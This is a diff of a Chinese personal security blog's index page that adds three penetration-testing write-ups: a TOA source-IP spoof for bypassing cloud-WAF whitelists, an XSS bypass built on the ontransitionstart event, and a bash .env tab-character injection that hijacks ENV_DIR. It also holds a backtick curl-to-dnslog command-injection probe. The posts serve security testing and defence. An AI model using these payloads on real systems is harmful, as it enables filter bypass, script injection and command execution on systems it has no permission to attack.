@@ -125,7 +125,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-count">44</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -168,7 +168,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-old_link/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(5)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -181,7 +181,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-old_link/" class="post-title-link" itemprop="url">历史文章存档</a>
+          <a href="/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(5)/" class="post-title-link" itemprop="url">WAF攻防实践(5)</a>
         </h2>
 
         <div class="post-meta-container">
@@ -205,8 +205,276 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>2017-2019年的历史文章，共8篇</p>
-<p><a target="_blank" rel="noopener" href="https://leveryd.github.io/">https://leveryd.github.io/</a></p>
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p><a target="_blank" rel="noopener" href="https://github.com/pyn3rd/papers/blob/master/KCon_2019_WAF.pdf">How to Break Through Cloud-Based WAF</a> 提到: 攻击者可以利用”TOA模块”伪造客户端ip，如果厂商有ip白名单，攻击者就有可能绕过WAF的防护。</p>
+<p>按照我的理解，因为这种攻击方式可以用来伪造源ip，所以它不仅可以用来绕过WAF，还适用于”存在白名单ip防御措施”的场景，比如当后台管理系统只能”白名单ip”访问。</p>
+<p>当然这种绕过方式也有一定的前置条件，而且我感觉满足条件的攻击场景应该不多，所以这种绕过方式出现概率应该不高。</p>
+<p>建议读者先看一下原文的六页ppt，再来看我这篇”学习总结”。相比于原文，我补充了”测试脚本”和”测试时需要注意的两个小坑”，希望能节约读者测试验证时花费的时间。</p>
+<p>本文主要研究以下问题：</p>
+<ul>
+<li>TOA是什么？</li>
+<li>怎么测试目标是否存在这类问题？</li>
+</ul>
+<p>我在这个案例学到了一些小的知识点：</p>
+<ul>
+<li>tcp报文的options字段的格式</li>
+<li>企业中怎么获取真实 client ip</li>
+<li>怎么用scapy发送带seq、ack序号的报文</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>TOA是什么？</p>
+<p>是”TCP_option_address”的缩写；它和”X-Forwarded-For”一样，可以用来传递真实的”客户端ip”。</p>
+<blockquote>
+<p>两者的区别在于：”X-Forwarded-For”工作在”应用层”，”TOA”工作在”tcp层”</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Hollake/article/details/89327474">Tcp Options字段</a>可以包含<em>不固定数量</em>个下面这样的数据结构：</p>
+<blockquote>
+<p>Kind(1字节)   |  Length(1字节,可选)  | Info(n字节,可选)</p>
+</blockquote>
+<p><img src="https://user-images.githubusercontent.com/1846319/129451573-252bb058-f3db-40ef-abe1-001863eb1b81.png" alt="image"></p>
+</li>
+</ul>
+<ul>
+<li><p>怎么用”TOA”实现传递客户端ip呢？</p>
+<p>有”转发服务”和”后端真实服务器”两个角色。</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/129451679-2e631ddf-c1b0-433a-afbe-fedc777fb9b2.png" alt="image"></p>
+<p>“转发服务”在tcp包的options字段塞入真实的”客户端ip”。</p>
+<p>在”后端真实服务器”安装一些”内核模块”后，应用程序就可以用getpeername、accept等系统调用拿到真实的”客户端ip”。这些”内核模块”(比如<a target="_blank" rel="noopener" href="https://github.com/baidu/ttm">百度ttm</a>、<a target="_blank" rel="noopener" href="https://github.com/Huawei/TCP_option_address">华为toa</a>)hook了用来接受包的内核函数。当收到数据包时，它们会遍历tcp包的options字段，然后取出真实的”客户端ip”，最终返回给应用层。</p>
+</li>
+<li><p>怎么绕过WAF？</p>
+<p>在云waf架构中，一个http请求的数据流是：客户端(浏览器) -&gt; 转发服务(bgw) -&gt; waf检测集群 -&gt; 源站。</p>
+<p>其中waf检测集群拿到的”客户端ip”是”转发服务”处理后的。</p>
+<p>如果客户端发包时在tcp包的options字段加入伪造的客户端ip和端口，且”转发服务”没有检查tcp包的options字段中是否有伪造的”客户端ip”，就会导致”waf检测集群”拿到伪造的客户端ip和端口。</p>
+<p>如果有对来源ip做白名单机制，就会存在绕过。</p>
+</li>
+<li><p>怎么测试目标是否存在这类问题？</p>
+<p>针对云waf可以这么测试：客户端发攻击包同时伪造来源ip，然后在控制台查看拦截日志。如果拦截日志中的攻击源ip不是真实ip，就说明存在问题。</p>
+<p>客户端发包代码见 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/03bc78c6d6badaa5a80eddf684bccf0e">gist</a></p>
+<p>其中有两点需要注意：</p>
+<blockquote>
+<p>系统收到服务端的syn-ack包时，因为网络连接不存在，所以会回复一个rst包。这会影响测试，因此测试前要屏蔽掉回复的rst包。</p>
+<p>在伪造ip时，tcp options需要和测试目标”后端真实服务器”用的数据结构相同。这个数据结构可以参考 <a target="_blank" rel="noopener" href="https://github.com/baidu/ttm">百度ttm</a>、<a target="_blank" rel="noopener" href="https://github.com/Huawei/TCP_option_address">华为toa</a>。</p>
+</blockquote>
+<p>另外建议在客户端抓包看下流量是否符合预期，以下是我测试时抓包的数据，可以看到tcp options字段已经有了我设置的”kind是238的数据”。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# tcpdump host 120.92.15.189</span><br><span class="line">...</span><br><span class="line">17:27:08.411615 IP instance-fj5pftdp.entextxid &gt; 120.92.15.189.http: Flags [S], seq 0, win 8192, options [unknown-238 0xcafe94c16441,nop,nop,eol], length 0</span><br><span class="line">17:27:08.462963 IP 120.92.15.189.http &gt; instance-fj5pftdp.entextxid: Flags [S.], seq 4179803533, ack 1, win 8192, options [unknown-238 0xcafe94c16441,nop,nop,eol], length 0</span><br><span class="line">17:27:08.496708 IP instance-fj5pftdp.entextxid &gt; 120.92.15.189.http: Flags [.], seq 1:50, ack 1, win 8192, options [unknown-238 0xcafe94c16441,nop,nop,eol], length 49: HTTP: GET &#x2F;?a&#x3D;..&#x2F;..&#x2F;..&#x2F; HTTP&#x2F;1.1</span><br><span class="line">17:27:08.548138 IP 120.92.15.189.http &gt; instance-fj5pftdp.entextxid: Flags [.], ack 50, win 29200, length 0</span><br><span class="line">17:27:08.550722 IP 120.92.15.189.http &gt; instance-fj5pftdp.entextxid: Flags [.], seq 1:513, ack 50, win 29200, length 512: HTTP: HTTP&#x2F;1.1 403 Forbidden</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>厂商只要转发包时，抹去所有tcp options字段 或者 检查tcp opitons有没有奇怪的kind，就可以避免这个问题，这也是我觉得这种问题出现概率不高的原因。我没有对很多厂商做测试，如果大家有啥新发现，可以公众号后台私信我。</p>
+<p>另外我把数据包文件放在了<a target="_blank" rel="noopener" href="https://github.com/leveryd/picture/blob/main/test.pcap">test.pcap</a>，如果对tcp options格式字段有疑问，就可以用wireshark打开数据包看看。</p>
+<p>留给读者一个问题：nmap -S 参数也能伪造源ip，它和本文这种方式有什么区别呢？</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(4)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(4)/" class="post-title-link" itemprop="url">WAF攻防实践(4)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>上周在做安全测试时，发现站点的xss能够插入标签，当我想用on事件来执行javascript脚本时，发现被waf拦截了。</p>
+<p>经常怼waf的，应该会碰到过，waf针对标签on属性名的拦截策略分为两种：</p>
+<ul>
+<li>on属性名在黑名单列表</li>
+<li>以on开头，且满足其他条件，比如字符串长度大于一定长度</li>
+</ul>
+<p>举个例子，payload包含<code>&lt;div onXXXXX=alert(1)&gt;</code>时，按照第一种策略，只有<code>onXXXXX</code>在黑名单列表中，才会被拦截。第二种策略就直接拦截了，因为<code>onXXXXX</code>以<code>on</code>开头，且还比较长。</p>
+<p>本文碰到的waf拦截策略是第一种，所以只要找到一个on属性不在黑名单列表中，就应该可以绕过。</p>
+<p>所以问题变成了：</p>
+<ul>
+<li>怎么找到所有的on属性？</li>
+<li>怎么判断哪个on属性没有被过滤？</li>
+<li>怎么利用未过滤的on事件？</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>怎么找到所有的on属性？</p>
+<p>前端遍历BOM对象document的属性即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">let results &#x3D; []</span><br><span class="line">for (let i in document)&#123;</span><br><span class="line">  if(i.startsWith(&quot;on&quot;))&#123;</span><br><span class="line">    results.push(i)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">console.log(results)</span><br><span class="line">localStorage.onAttrs&#x3D;JSON.stringify(results)</span><br></pre></td></tr></table></figure>
+
+<p>因为results字符串非常长，会在chrome控制台会被截断，所以把它存到localStorage中，结果在 Chrome devtool -&gt; Application -&gt; Storage 中可以找到。</p>
+</li>
+<li><p>怎么判断哪个on属性没有被过滤？</p>
+<p>用burpsuite的intruder爆破模块过一遍，发现有两个属性没有拦截：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ontransitionstart</span><br><span class="line">onbeforexrselect</span><br></pre></td></tr></table></figure>
+
+<p>这两个属性我之前也没见过，那怎么利用这两个属性执行js呢？</p>
+</li>
+<li><p>怎么利用<code>ontransitionstart</code>属性？</p>
+<p>根据<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/transitionstart_event">MDN-transitionstart文档</a>构造出利用方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;transition&quot; ontransitionstart&#x3D;&quot;alert(1)&quot;&gt;Hover over me&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">.transition &#123;</span><br><span class="line">  width: 10000px;</span><br><span class="line">  height: 10000px;</span><br><span class="line">  background: rgba(255,0,0,1);</span><br><span class="line">  transition-property: transform, background;</span><br><span class="line">  transition-duration: 1s;</span><br><span class="line">  transition-delay: 1s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.transition:hover &#123;</span><br><span class="line">  transform: rotate(90deg);</span><br><span class="line">  background: rgba(255,0,0,0);</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
+
+<p>虽然文档写的chrome和firefox都支持transitionstart事件，但是上面的利用payload实际测试结果：</p>
+<blockquote>
+<p>firefox可以、chrome不行</p>
+</blockquote>
+<p>chrome用addEventListener可以监听<code>transitionstart</code>事件，但不能用<code>ontransitionstart</code>来监听事件。这个原因不知道为啥。</p>
+</li>
+<li><p>怎么利用<code>onbeforexrselect</code>属性？</p>
+<p>根据<a target="_blank" rel="noopener" href="https://immersive-web.github.io/dom-overlays/">onbeforexrselect文档</a>来看，似乎<code>beforexrselect</code>事件还只是一个草案。</p>
+<p>也因为transitionstart事件已经能利用了，所以也没有再研究。</p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li><p>从防守方来看，如果采用了on事件黑名单，就需要保证事件黑名单的全面。</p>
+</li>
+<li><p>chrome和firefox on属性有区别，或许可以作为一个区分浏览器的指纹特征（虽然感觉很不稳定）。</p>
+</li>
+<li><p>测试过程中，我还有一个疑问：不同元素之间的on属性是否会不同，比如div元素和document元素遍历出来的on属性是否会不同。有知道答案的读者可以后台告诉我。</p>
+</li>
+</ul>
+<h1 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h1><p>我个人把防火墙的绕过分为两个类别：</p>
+<ul>
+<li>架构层面的绕过，这种绕过不太关心具体的漏洞类型是xss还是sql注入</li>
+<li>漏洞类型相关的绕过</li>
+</ul>
+<p>第一种架构层面的绕过姿势比较难找，这种较为通用的绕过姿势，从攻击队视角来看我觉得比较适合扫描器来绕过防火墙。这也是<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qAv2wspeuCfhCjTaz03hNg">你的扫描器可以绕过防火墙么</a>系列文章名称的由来。</p>
+<p>后面就都写到这个”waf攻防实践”系列里来。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Bash%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Case/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-Bash%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Case/" class="post-title-link" itemprop="url">Bash代码审计Case</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>我在一次安全评估过程中，幸运地遇到了一个可以污染环境变量的漏洞点。</p>
+<p>不过因为开发工程师做了黑名单字符的判断，所以并不能很容易地利用。</p>
+<p>服务是使用bash脚本编写的，漏洞点的代码片段如下。其中<code>$PROJECT_DIR</code>目录下我可以创建任意文件，并且<code>$PROJECT_DIR/.env</code>文件内容是我完全可控的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if [ -f &quot;$PROJECT_DIR&#x2F;.env&quot; ]; then</span><br><span class="line">    # 过滤所有特殊字符，并只保留所有USER_前缀的环境变量，避免用户变量污染</span><br><span class="line">    echo &quot;加载用户自定义环境变量&quot;</span><br><span class="line">    cat $PROJECT_DIR&#x2F;.env | grep &#39;^USER_.*&#39; | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39;</span><br><span class="line">    export $(grep -v &#39;^#&#39; $PROJECT_DIR&#x2F;.env | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; | xargs)   # 使用字符黑名单做的限制,不允许使用  ;)(&#96;|&amp; 任何一个字符</span><br><span class="line">    echo &quot;&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">source $ENV_DIR   # 执行另外一个脚本</span><br></pre></td></tr></table></figure>
+
+<p>业务使用者正常情况下，会在<code>$PROJECT_DIR/.env</code>文件写入下面这种格式的内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USER_X&#x3D;1</span><br><span class="line">USER_Y&#x3D;2</span><br></pre></td></tr></table></figure>
+<p>每一行以USER_开头，被解析成环境变量给后续的程序使用。</p>
+<p>我尝试将 <code>$PROJECT_DIR/.env</code> 文件内容写成下面这样，来命令执行或者造成环境变量污染</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;curl xxx.dnslog.com&#96;   # &#96;&#96;来命令执行</span><br><span class="line"> new_variable&#x3D;11    # 用空格分割来注入新的环境变量</span><br></pre></td></tr></table></figure>
+<p>因为代码中的字符黑名单的限制，所以都无法成功。</p>
+<p>到这里的时候，我只能看看下面这行代码存不存绕过，能让我污染环境变量。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export $(grep -v &#39;^#&#39; $PROJECT_DIR&#x2F;.env | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; | xargs)</span><br></pre></td></tr></table></figure>
+
+<p>如果可以污染环境变量，就修改 ENV_DIR变量为我指定的文本路径，来执行我的脚本，从而达到命令执行的效果。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>我的想法是找下有没有不在黑名单的字符，能够让我生成新的变量。</p>
+<p>于是就写了简单的程序跑一下：遍历所有单字节的字符，如果能够生成新的XXX变量，就打印这个字符。</p>
+<p>代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1,256):</span><br><span class="line">    path &#x3D; &quot;&#x2F;tmp&#x2F;env&quot; + str(i)</span><br><span class="line">    with open(path, &quot;w&quot;) as f:</span><br><span class="line">        f.write(&quot;USER_X&#x3D;Y&quot; + chr(i) + &quot;XXX&#x3D;YY&quot;)</span><br><span class="line">    cmd &#x3D; &quot;&quot;&quot;export $(grep -v &#39;^#&#39; %s | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; 2&gt;&#x2F;dev&#x2F;null | xargs) 1&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 ;echo %s;env|grep -i &quot;^XXX&quot;|wc -l&quot;&quot;&quot; % (path, str(i))</span><br><span class="line">    with open(&quot;&#x2F;tmp&#x2F;1.sh&quot;, &quot;w&quot;) as f:</span><br><span class="line">        f.write(cmd)</span><br><span class="line">    os.system(&quot;bash &#x2F;tmp&#x2F;1.sh&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>结果 \x09 也就是 \t 可以生成新变量。</p>
+<p>所以我控制 $PROJECT_DIR/.env 内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\tENV_DIR&#x3D;&#x2F;PROJECT_DIR_ABSOLUATE_PATH&#x2F;my.sh</span><br></pre></td></tr></table></figure>
+<p>就可以让服务执行我的my.sh脚本。注意这里的  <code>\t</code>是 \x09 字符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;.env&quot;) as f:</span><br><span class="line">    f.write(&quot;\x09ENV_DIR&#x3D;&#x2F;PROJECT_DIR_ABSOLUATE_PATH&#x2F;my.sh&quot;)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个case能造成命令执行的最初原因是开发工程师漏掉了 \x09 字符，而 \x09 字符也可以被xargs命令用来作为分隔符号。</p>
+<p>另外，在判断有没有字符能够突破某某限制时，用遍历的思想让程序去找，实现简单且效果很好。</p>
+<p>当我在写这篇总结的时候，发现man xargs手册中已经很清楚地说明了xargs会以 空格、tab按键、换行、EOF字符作为分割。或许后面在评估过程中，想测试命令是否存在安全问题前应该看看man手册的说明。</p>
 
       
     </div>
@@ -348,99 +616,6 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Bash%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Case/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-Bash%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Case/" class="post-title-link" itemprop="url">Bash代码审计Case</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>我在一次安全评估过程中，幸运地遇到了一个可以污染环境变量的漏洞点。</p>
-<p>不过因为开发工程师做了黑名单字符的判断，所以并不能很容易地利用。</p>
-<p>服务是使用bash脚本编写的，漏洞点的代码片段如下。其中<code>$PROJECT_DIR</code>目录下我可以创建任意文件，并且<code>$PROJECT_DIR/.env</code>文件内容是我完全可控的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if [ -f &quot;$PROJECT_DIR&#x2F;.env&quot; ]; then</span><br><span class="line">    # 过滤所有特殊字符，并只保留所有USER_前缀的环境变量，避免用户变量污染</span><br><span class="line">    echo &quot;加载用户自定义环境变量&quot;</span><br><span class="line">    cat $PROJECT_DIR&#x2F;.env | grep &#39;^USER_.*&#39; | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39;</span><br><span class="line">    export $(grep -v &#39;^#&#39; $PROJECT_DIR&#x2F;.env | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; | xargs)   # 使用字符黑名单做的限制,不允许使用  ;)(&#96;|&amp; 任何一个字符</span><br><span class="line">    echo &quot;&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">source $ENV_DIR   # 执行另外一个脚本</span><br></pre></td></tr></table></figure>
-
-<p>业务使用者正常情况下，会在<code>$PROJECT_DIR/.env</code>文件写入下面这种格式的内容。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USER_X&#x3D;1</span><br><span class="line">USER_Y&#x3D;2</span><br></pre></td></tr></table></figure>
-<p>每一行以USER_开头，被解析成环境变量给后续的程序使用。</p>
-<p>我尝试将 <code>$PROJECT_DIR/.env</code> 文件内容写成下面这样，来命令执行或者造成环境变量污染</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;curl xxx.dnslog.com&#96;   # &#96;&#96;来命令执行</span><br><span class="line"> new_variable&#x3D;11    # 用空格分割来注入新的环境变量</span><br></pre></td></tr></table></figure>
-<p>因为代码中的字符黑名单的限制，所以都无法成功。</p>
-<p>到这里的时候，我只能看看下面这行代码存不存绕过，能让我污染环境变量。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export $(grep -v &#39;^#&#39; $PROJECT_DIR&#x2F;.env | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; | xargs)</span><br></pre></td></tr></table></figure>
-
-<p>如果可以污染环境变量，就修改 ENV_DIR变量为我指定的文本路径，来执行我的脚本，从而达到命令执行的效果。</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>我的想法是找下有没有不在黑名单的字符，能够让我生成新的变量。</p>
-<p>于是就写了简单的程序跑一下：遍历所有单字节的字符，如果能够生成新的XXX变量，就打印这个字符。</p>
-<p>代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1,256):</span><br><span class="line">    path &#x3D; &quot;&#x2F;tmp&#x2F;env&quot; + str(i)</span><br><span class="line">    with open(path, &quot;w&quot;) as f:</span><br><span class="line">        f.write(&quot;USER_X&#x3D;Y&quot; + chr(i) + &quot;XXX&#x3D;YY&quot;)</span><br><span class="line">    cmd &#x3D; &quot;&quot;&quot;export $(grep -v &#39;^#&#39; %s | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; 2&gt;&#x2F;dev&#x2F;null | xargs) 1&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 ;echo %s;env|grep -i &quot;^XXX&quot;|wc -l&quot;&quot;&quot; % (path, str(i))</span><br><span class="line">    with open(&quot;&#x2F;tmp&#x2F;1.sh&quot;, &quot;w&quot;) as f:</span><br><span class="line">        f.write(cmd)</span><br><span class="line">    os.system(&quot;bash &#x2F;tmp&#x2F;1.sh&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>结果 \x09 也就是 \t 可以生成新变量。</p>
-<p>所以我控制 $PROJECT_DIR/.env 内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\tENV_DIR&#x3D;&#x2F;PROJECT_DIR_ABSOLUATE_PATH&#x2F;my.sh</span><br></pre></td></tr></table></figure>
